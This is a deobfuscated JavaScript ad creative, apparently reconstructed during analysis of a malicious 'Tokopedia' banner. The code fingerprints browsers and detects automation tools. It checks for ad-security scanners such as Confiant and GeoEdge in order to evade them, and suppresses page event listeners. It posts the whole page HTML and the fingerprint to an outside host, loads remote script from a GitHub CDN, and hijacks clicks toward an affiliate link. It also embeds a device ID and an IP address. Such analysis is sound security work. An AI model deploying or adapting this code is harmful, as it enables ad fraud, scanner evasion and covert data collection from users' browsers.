/*
 * Source: inline script 2
 * Generated from /Users/zheng/Documents/zed/banner/tokopedia.txt
 * Notes:
 * - Full inline JS control flow is preserved.
 * - String-table lookups were expanded.
 * - Hex-encoded strings were decoded where they were directly visible.
 * - Key one-letter functions were renamed based on behavior.
 * - Local generated variables remain when renaming them would risk changing scope.
 */

(function tokopediaBannerRuntime() {
  "use strict";

  const BID_ID = "g3id8aa92896f2662be2b000v6f000071781660315394";
  const DEEPLINK_URL = "tokopedia://home";
  const LANDING_URL =
    "https://tokopedia.app.link/FxrzUgpjcYb?%243p=a_adeliver&~click_id=g3id8aa92896f2662be2b000v6f000071781660315394&~campaign_id=1797&~secondary_publisher=14382&utm_campaign=adlv-act-14382-adeliver-act-ord-pg-id51pgce51-0000-alon-adlv&~campaign=adlv-act-14382-adeliver-act-ord-pg-id51pgce51-0000-alon-adlv&~channel=14382_264";
  const TRACKER_DELAY_BUCKET = "195.32501209946028";

  const CLICK_TRACKER_URLS = [];

  function readAdHijackConfig() {
    const config = window.AD_HIJACK_CONFIG || {};
    const landingUrl =
      typeof config.LANDING_URL === "string" && config.LANDING_URL
        ? config.LANDING_URL
        : LANDING_URL;
    const deeplinkUrl =
      typeof config.DEEPLINK_URL === "string" && config.DEEPLINK_URL
        ? config.DEEPLINK_URL
        : DEEPLINK_URL;
    const clickTrackerUrls = Array.isArray(config.CLICK_TRACKER_URLS)
      ? config.CLICK_TRACKER_URLS.filter(
          (url) => typeof url === "string" && url,
        )
      : CLICK_TRACKER_URLS;

    return {
      LANDING_URL: landingUrl,
      DEEPLINK_URL: deeplinkUrl,
      CLICK_TRACKER_URLS: clickTrackerUrls.length
        ? clickTrackerUrls
        : CLICK_TRACKER_URLS,
    };
  }

  const ENDPOINTS = {
    collectHtml:
      "https://sg.aibidstat.top/st/c?b_d=g3id8aa92896f2662be2b000v6f000071781660315394&affiliate_id=264&ad_group_id=40407&bundle=com.fugo.wow&ip=139.0.76.95&schain=chartboost.com%2Cwww.ad.com&device_id=be7b636a-0999-461f-9f4b-4a5774cf8d8c",
    collectFeatures:
      "https://sg.aibidstat.top/st/f?b_d=g3id8aa92896f2662be2b000v6f000071781660315394&affiliate_id=264&ad_group_id=40407&bundle=com.fugo.wow&ip=139.0.76.95&schain=chartboost.com%2Cwww.ad.com&device_id=be7b636a-0999-461f-9f4b-4a5774cf8d8c",
    errorPixelBase:
      "https://sg.aibidstat.top/ft/e?b_d=g3id8aa92896f2662be2b000v6f000071781660315394&affiliate_id=264&ad_group_id=40407&bundle=com.fugo.wow&ip=139.0.76.95&schain=chartboost.com%2Cwww.ad.com&device_id=be7b636a-0999-461f-9f4b-4a5774cf8d8c",
    dynamicTrackerBase: "https://cdn.jsdelivr.net/gh/amswf/code@main/fj",
    visibility:
      "https://sg.aibidstat.top/visibility?bid_id=g3id8aa92896f2662be2b000v6f000071781660315394&ad_group_id=40407&ad_id=407960&creative_id=25639&device_id=be7b636a-0999-461f-9f4b-4a5774cf8d8c&affiliate_id=264&bundle=com.fugo.wow&first_ssp=chartboost.com&adv_id=710&country=IDN&ad_format=BANNER&deeplink_url_type=0&domain=&response_type=1&device_id_2=be7b636a-0999-461f-9f4b-4a5774cf8d8c&device_id_2_type=gaid&carty_one_id=CAESEDz-6Uc8s0Rav80dOAtKOyE",
  };

  const TOP_LEVEL_EVENTS_TO_SUPPRESS = [
    "click",
    "blur",
    "touchstart",
    "touchend",
    "mousedown",
    "mousemove",
    "focus",
    "redirect",
    "onblur",
  ];

  const AD_QUALITY_MARKERS = [
    "adlightning.com",
    "createTagDetails",
    "confiant",
    "cnftData",
    '"tpid"',
    "casprInvocation",
    "Caspr",
    "cnft:",
    "crm_prc_src",
    "metricsServer",
  ];

  const GEOEDGE_MARKERS = ["window.grumi", "rumcdn.geoedge", "geoedge"];
  const MEDIA_FILTER_MARKERS = ["webcontentassessor", "window.adObject"];

  let sawGrumiResource = false;
  let sawWebContentAssessorResource = false;
  let sawConfiantResource = false;

  const originalAddEventListener =
    window.addEventListener || document.addEventListener;
  const originalAttachEvent = window.attachEvent || document.attachEvent;

  function isTopLevelTarget(target) {
    return target === window || target === document || target === document.body;
  }

  function filteredAddEventListener(type, listener, options) {
    if (TOP_LEVEL_EVENTS_TO_SUPPRESS.includes(type) && isTopLevelTarget(this)) {
      return undefined;
    }

    return originalAddEventListener.call(document, type, listener, options);
  }

  function filteredAttachEvent(type, listener) {
    const normalizedType = String(type || "").slice(2);
    if (
      !originalAttachEvent ||
      (TOP_LEVEL_EVENTS_TO_SUPPRESS.includes(normalizedType) &&
        isTopLevelTarget(this))
    ) {
      return undefined;
    }

    return originalAttachEvent.call(this, type, listener);
  }

  function installEventFilters() {
    window.__ael = originalAddEventListener;
    window.addEventListener = filteredAddEventListener;
    document.addEventListener = filteredAddEventListener;
    document.body.addEventListener = filteredAddEventListener;
    window.attachEvent = filteredAttachEvent;
    document.attachEvent = filteredAttachEvent;
    document.body.attachEvent = filteredAttachEvent;
  }

  function safeGet(label, fn, fallback) {
    try {
      return fn();
    } catch (error) {
      if (label) {
        reportErrorPixel(label, error.message);
      }
      return fallback;
    }
  }

  function createHttpRequest() {
    try {
      return new XMLHttpRequest();
    } catch (xhrError) {
      try {
        return new ActiveXObject("Msxml2.XMLHTTP");
      } catch (msxmlError) {
        try {
          return new ActiveXObject("Microsoft.XMLHTTP");
        } catch (activexError) {
          reportErrorPixel("create_http", activexError.message);
          return false;
        }
      }
    }
  }

  function attachXhrErrorHandlers(xhr, reportType) {
    xhr.onload = function onXhrLoad() {
      if (xhr.readyState === 4 && xhr.status !== 200) {
        reportErrorPixel(reportType + "_failed", xhr.status);
      }
    };
    xhr.onerror = function onXhrError() {
      reportErrorPixel(reportType + "_onerror", "");
    };
    xhr.onabort = function onXhrAbort() {
      reportErrorPixel(reportType + "_onabort", "");
    };
    xhr.ontimeout = function onXhrTimeout() {
      reportErrorPixel(reportType + "_ontimeout", "");
    };
  }

  function postJson(url, body, reportType) {
    const xhr = createHttpRequest();
    if (!xhr) {
      return;
    }

    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-type", "application/json");
    attachXhrErrorHandlers(xhr, reportType);
    xhr.send(JSON.stringify(body));
  }

  function reportErrorPixel(type, detail) {
    new Image().src =
      ENDPOINTS.errorPixelBase +
      "&type=" +
      type +
      "&error=" +
      encodeURIComponent(detail);
  }

  function getDocumentHtml() {
    const originalMarkup = document.documentElement.om;
    return typeof originalMarkup === "string"
      ? originalMarkup
      : document.documentElement.outerHTML;
  }

  function collectHtmlSnapshot() {
    safeGet("collect_script", function collectHtml() {
      postJson(
        ENDPOINTS.collectHtml,
        { c: getDocumentHtml() },
        "collect_script",
      );
    });
  }

  function collectFeatureSnapshot() {
    postJson(
      ENDPOINTS.collectFeatures,
      collectAllFeatures(),
      "collect_feature",
    );
  }

  function extractGeoEdgeScriptUrl(html) {
    if (!html) {
      return "";
    }

    const match =
      /<script[^>]*src=["']([^"']*geoedge\.be[^"']*)["'][^>]*>/i.exec(html);
    return match ? match[1] : "";
  }

  function detectGeoEdgeRuntime() {
    const result = {
      gf: false,
      go: false,
      gi: false,
      gu: "",
    };

    try {
      const grumiFrame = window.top.frames.grumiFrame;
      if (grumiFrame) {
        result.gf = true;
        result.gu = extractGeoEdgeScriptUrl(
          grumiFrame.contentWindow.document.documentElement.outerHTML,
        );
      }
    } catch (error) {}

    try {
      result.go = window.top.grumi !== undefined;
    } catch (error) {}

    try {
      const frames = window.top.frames;
      for (let index = 0; index < frames.length; index += 1) {
        const frame = frames[index];
        if (!frame || !frame.grumiInstances) {
          continue;
        }

        const scriptUrl = extractGeoEdgeScriptUrl(
          frame.document.documentElement.outerHTML,
        );
        if (scriptUrl) {
          result.gu = result.gu || scriptUrl;
          result.gi = true;
          break;
        }
      }
    } catch (error) {}

    return result;
  }

  function detectConfiantAndCasprRuntime() {
    const result = {
      nb: false,
      cf: false,
      ci: false,
      cs: false,
      np: false,
    };

    try {
      result.nb = !!Node.__cspr__;
    } catch (error) {}

    try {
      result.cf = !!window.top.frames.cnftComm;
    } catch (error) {}

    try {
      result.ci = !!window.top.confiant;
    } catch (error) {}

    try {
      result.cs =
        window.top.document.documentElement.outerHTML.indexOf(
          "confiant-integrations",
        ) > -1;
    } catch (error) {}

    try {
      const appendChildSource = window.Node.prototype.appendChild.toString();
      const insertBeforeSource = window.Node.prototype.insertBefore.toString();
      const hookNeedles = ["(this,arguments)", "console"];
      result.np =
        hookNeedles.every((needle) => appendChildSource.indexOf(needle) > -1) ||
        hookNeedles.every((needle) => insertBeforeSource.indexOf(needle) > -1);
    } catch (error) {}

    return result;
  }

  function hasAnyDocumentMarker(markers) {
    const html = getDocumentHtml();
    return html !== "" && markers.some((marker) => html.indexOf(marker) !== -1);
  }

  function detectAdQualityTooling() {
    if (sawConfiantResource || hasAnyDocumentMarker(AD_QUALITY_MARKERS)) {
      return true;
    }

    const confiantAndCaspr = detectConfiantAndCasprRuntime();
    return Boolean(
      confiantAndCaspr.nb ||
      confiantAndCaspr.cf ||
      confiantAndCaspr.ci ||
      confiantAndCaspr.cs ||
      confiantAndCaspr.np,
    );
  }

  function scoreGeoEdgeOrInjectedTracking() {
    let score = 0;

    if (sawGrumiResource || hasAnyDocumentMarker(GEOEDGE_MARKERS)) {
      score = 1;
    }

    const trackedElementIds = ["brx_banner_img", "brx_p_c"];
    const expectedAttributes = ["id", "type", "style", "src", "border"];
    const unknownAttributes = [];
    const unknownAttributeValues = [];

    trackedElementIds.forEach((elementId) => {
      const element = document.getElementById(elementId);
      if (!element) {
        return;
      }

      Array.from(element.attributes).forEach((attribute) => {
        if (expectedAttributes.indexOf(attribute.name) === -1) {
          unknownAttributes.push(attribute.name);
          unknownAttributeValues.push(attribute.value);
        }
      });
    });

    if (unknownAttributes.length > 1 && unknownAttributeValues.length > 1) {
      const hasThirteenDigitNumericValue = unknownAttributeValues.some(
        (value) => {
          const numberValue = Number(value);
          return !Number.isNaN(numberValue) && String(value).length === 13;
        },
      );
      if (hasThirteenDigitNumericValue) {
        score = 1;
      }
    }

    if (window.grumiInstance) {
      score = 1;
    }

    try {
      const hookNeedle = "t.apply(this,arguments)";
      const hookedNativeMethods = [
        window.Node.prototype.appendChild,
        window.EventTarget.prototype.dispatchEvent,
        window.Element.prototype.insertAdjacentElement,
        window.HTMLFormElement.prototype.submit,
      ];

      if (
        hookedNativeMethods.some((fn) => fn.toString().indexOf(hookNeedle) > -1)
      ) {
        score = 1;
      }
    } catch (error) {}

    try {
      const geoEdgeRuntime = detectGeoEdgeRuntime();
      if (geoEdgeRuntime.gf || geoEdgeRuntime.go || geoEdgeRuntime.gi) {
        score = 1;
      }
    } catch (error) {}

    try {
      if ("getHtml" in window && "getTag" in window && "getEntries" in window) {
        score += 4;
      }
    } catch (error) {}

    return score;
  }

  function scoreMediaFilterTooling() {
    if (
      sawWebContentAssessorResource ||
      hasAnyDocumentMarker(MEDIA_FILTER_MARKERS)
    ) {
      return 2;
    }

    try {
      return window.Node.prototype.appendChild
        .toString()
        .indexOf("mediafilter") > -1
        ? 2
        : 0;
    } catch (error) {
      return 0;
    }
  }

  const featureCollectors = {
    ifrt() {
      return window.frameElement !== null;
    },

    act: detectAdQualityTooling,

    ifsnd() {
      return window.frameElement
        ? [window.frameElement.getAttribute("sandbox")]
        : [];
    },

    mraid_exist() {
      return "mraid" in window;
    },

    user_agent() {
      return navigator.userAgent;
    },

    web_driver() {
      return navigator.webdriver;
    },

    plugins() {
      return Array.from(navigator.plugins).map((plugin) => {
        const pluginInfo = [
          plugin.name,
          plugin.description,
          plugin.filename,
          plugin.version,
        ].join("::");
        const mimeInfo = Object.keys(plugin)
          .map((key) => {
            return [
              plugin[key].type,
              plugin[key].suffixes,
              plugin[key].description,
            ].join("~");
          })
          .join(",");
        return pluginInfo + "__" + mimeInfo;
      });
    },

    mime_types() {
      return Array.from(navigator.mimeTypes).map((mimeType) => {
        return [mimeType.description, mimeType.type, mimeType.suffixes].join(
          "~~",
        );
      });
    },

    platform() {
      return navigator.platform || "unknow";
    },

    phantom_js_features() {
      return [
        "callPhantom" in window,
        "_phantom" in window,
        "phantom" in window,
      ];
    },

    nightmare_js() {
      return !!window.__nightmare;
    },

    selenium_features() {
      return [
        "webdriver" in window,
        "_Selenium_IDE_Recorder" in window,
        "callSelenium" in window,
        "_selenium" in window,
        "__webdriver_script_fn" in document,
        "__driver_evaluate" in document,
        "__webdriver_evaluate" in document,
        "__selenium_evaluate" in document,
        "__fxdriver_evaluate" in document,
        "__driver_unwrapped" in document,
        "__webdriver_unwrapped" in document,
        "__selenium_unwrapped" in document,
        "__fxdriver_unwrapped" in document,
        "__webdriver_script_func" in document,
        document.documentElement.getAttribute("selenium") !== null,
        document.documentElement.getAttribute("webdriver") !== null,
        document.documentElement.getAttribute("driver") !== null,
      ];
    },

    web_gl() {
      try {
        const canvas = document.createElement("canvas");
        const context =
          canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        const debugInfo = context.getExtension("WEBGL_debug_renderer_info");

        if (
          !debugInfo ||
          context
            .getSupportedExtensions()
            .indexOf("WEBGL_debug_renderer_info") < 0
        ) {
          return {
            webGLVendor: "Not supported",
            webGLRenderer: "Not supported",
          };
        }

        return {
          webGLVendor: context.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
          webGLRenderer: context.getParameter(
            debugInfo.UNMASKED_RENDERER_WEBGL,
          ),
        };
      } catch (error) {
        return {
          webGLVendor: "error",
          webGLRenderer: "error",
        };
      }
    },

    canvas() {
      const canvas = document.createElement("canvas");
      const context = canvas.getContext("2d");

      if (!context) {
        return {};
      }

      return {
        supportTextMetrics: typeof context.measureText === "function",
        supportImageData: typeof context.getImageData === "function",
        supportToDataURL: typeof canvas.toDataURL === "function",
      };
    },

    web_rtc() {
      const devices = {
        speakers: 0,
        micros: 0,
        webcams: 0,
      };

      if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
        return devices;
      }

      if (
        navigator.mediaDevices.enumerateDevices.name === "bound reportBlock"
      ) {
        devices.devicesBlockedByBrave = true;
        return undefined;
      }

      navigator.mediaDevices.enumerateDevices().then((deviceList) => {
        const counts = {
          audiooutput: 0,
          audioinput: 0,
          videoinput: 0,
        };

        if (!deviceList) {
          return;
        }

        deviceList.forEach((device) => {
          counts[device.kind] += 1;
        });

        devices.speakers = counts.audiooutput;
        devices.micros = counts.audioinput;
        devices.webcams = counts.videoinput;
      });

      return devices;
    },

    fonts() {
      const probe = document.createElement("span");
      probe.textContent = "font computed";
      document.body.appendChild(probe);

      const style = getComputedStyle(probe);
      const result = {
        fontFamily: style.getPropertyValue("font-family"),
        fontSize: style.getPropertyValue("font-size"),
        fontWeight: style.getPropertyValue("font-weight"),
      };

      document.body.removeChild(probe);
      return result;
    },

    cdp() {
      const result = {};
      if (
        navigator.userAgent.indexOf("Chrome") === -1 ||
        typeof chrome === "undefined" ||
        chrome.runtime === undefined
      ) {
        return result;
      }

      const chromeVersion = /Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1];
      chrome.runtime.sendMessage({ type: "chrome://version" }, (response) => {
        const devToolsVersion = response.match(/DevTools\ ([0-9.]+)/)[1];
        result.version = chromeVersion;
        result.devToolsVersion = devToolsVersion;
      });

      return result;
    },

    request_uri() {
      return location.pathname + location.search;
    },

    query_string() {
      return window.location.search.substr(1);
    },

    os_time_zone() {
      return Intl.DateTimeFormat().resolvedOptions().timeZone;
    },

    got: scoreGeoEdgeOrInjectedTracking,
    tet: scoreMediaFilterTooling,
  };

  function collectAllFeatures() {
    const featureNames = [
      "ifrt",
      "act",
      "ifsnd",
      "mraid_exist",
      "user_agent",
      "web_driver",
      "plugins",
      "mime_types",
      "platform",
      "phantom_js_features",
      "nightmare_js",
      "selenium_features",
      "web_gl",
      "canvas",
      "web_rtc",
      "fonts",
      "cdp",
      "request_uri",
      "query_string",
      "os_time_zone",
      "got",
      "tet",
    ];

    const features = {};
    featureNames.forEach((name) => {
      try {
        features[name] = featureCollectors[name]();
      } catch (error) {
        reportErrorPixel("collect_feature", error.message);
      }
    });

    return features;
  }

  function loadTrackerScript() {
    return new Promise((resolve, reject) => {
      try {
        const seleniumFlags = featureCollectors.selenium_features();
        const phantomFlags = featureCollectors.phantom_js_features();
        const hasWebDriverLikeSignal =
          (seleniumFlags && seleniumFlags.some(Boolean)) ||
          (phantomFlags && phantomFlags.some(Boolean)) ||
          featureCollectors.nightmare_js() ||
          featureCollectors.web_driver();

        const trackerUrl =
          ENDPOINTS.dynamicTrackerBase +
          "&delayTime=" +
          TRACKER_DELAY_BUCKET +
          "&kw=" +
          featureCollectors.act() +
          "&requestUri=" +
          encodeURIComponent(
            String(featureCollectors.request_uri() || "").slice(0, 300),
          ) +
          "&queryString=" +
          encodeURIComponent(
            String(featureCollectors.query_string() || "").slice(0, 300),
          ) +
          "&osTimeZone=" +
          encodeURIComponent(featureCollectors.os_time_zone()) +
          "&wd=" +
          hasWebDriverLikeSignal +
          "&kwt=" +
          (featureCollectors.got() + featureCollectors.tet()) +
          "&ua=" +
          encodeURIComponent(navigator.userAgent);

        const script = document.createElement("script");
        script.src = trackerUrl;
        script.async = true;
        script.onload = resolve;
        script.onerror = (event) => {
          reportErrorPixel(
            "script_onerror",
            JSON.stringify({
              type: event.type,
              src: event.target.src,
              timestamp: event.timeStamp,
              isTrusted: event.isTrusted,
              eventPhase: event.eventPhase,
            }),
          );
          reject("Failed to load script: " + trackerUrl);
        };

        document.body.appendChild(script);
      } catch (error) {
        reportErrorPixel("script_running_error", error.message);
      }
    });
  }

  function appendExtraTrackingPixel() {
    const encodedPixel = "";
    if (!encodedPixel) {
      return;
    }

    const pixel = document.createElement("img");
    pixel.src = decodeURIComponent(escape(atob(atob(encodedPixel))));
    pixel.style = "display:none";
    document.body.appendChild(pixel);
  }

  function observeResourceTimings() {
    const observedResources = [];

    function recordResourceTiming(entry) {
      const resourceUrl = entry.name.split("?")[0];

      observedResources.push({
        name: resourceUrl.slice(0, 30),
        initiatorType: entry.initiatorType,
        startTime: entry.startTime.toFixed(2),
        duration: entry.duration.toFixed(2),
        responseEnd: entry.responseEnd,
      });

      if (resourceUrl.includes("grumi.js")) {
        sawGrumiResource = true;
      }
      if (resourceUrl.includes("webcontentassessor")) {
        sawWebContentAssessorResource = true;
      }
      if (resourceUrl.includes("confiant-integrations")) {
        sawConfiantResource = true;
      }
      if (resourceUrl.includes("gw.geoedge.be/api/event")) {
        reportErrorPixel("gevt", JSON.stringify(observedResources));
      }
      if (resourceUrl.includes("api.mf.webcontentassessor.com/events/events")) {
        reportErrorPixel("tevt", JSON.stringify(observedResources));
      }
    }

    window.performance
      .getEntriesByType("resource")
      .forEach(recordResourceTiming);
    new PerformanceObserver((list) => {
      list.getEntries().forEach(recordResourceTiming);
    }).observe({ entryTypes: ["resource"] });
  }

  function initVisibilityTracking() {
    if (!window.TrackingSdk) {
      return;
    }

    try {
      const initResult = TrackingSdk.initSdk({
        gdpr: false,
        data: { b_id: BID_ID },
        env: "other",
        flag: true,
        area: "alisg",
        vaEndpoint: ENDPOINTS.visibility,
        onError: () => {},
      });

      const trackExposure = () => {
        TrackingSdk.trackEvent("exposure", { b_id: BID_ID });
      };

      if (initResult && initResult.then) {
        initResult.then(trackExposure);
      } else {
        trackExposure();
      }
    } catch (error) {}
  }

  function startRuntime() {
    initVisibilityTracking();

    safeGet(null, observeResourceTimings);
    safeGet(null, appendExtraTrackingPixel);
    safeGet(null, collectHtmlSnapshot);
    safeGet(null, collectFeatureSnapshot);

    loadTrackerScript()
      .then(() => {
        const adHijackConfig = readAdHijackConfig();
        addTrackers(
          adHijackConfig.CLICK_TRACKER_URLS,
          reportErrorPixel,
          adHijackConfig.DEEPLINK_URL,
          adHijackConfig.LANDING_URL,
        );
      })
      .catch(() => {});
  }

  installEventFilters();
  window.addEventListener("DOMContentLoaded", startRuntime);
})();
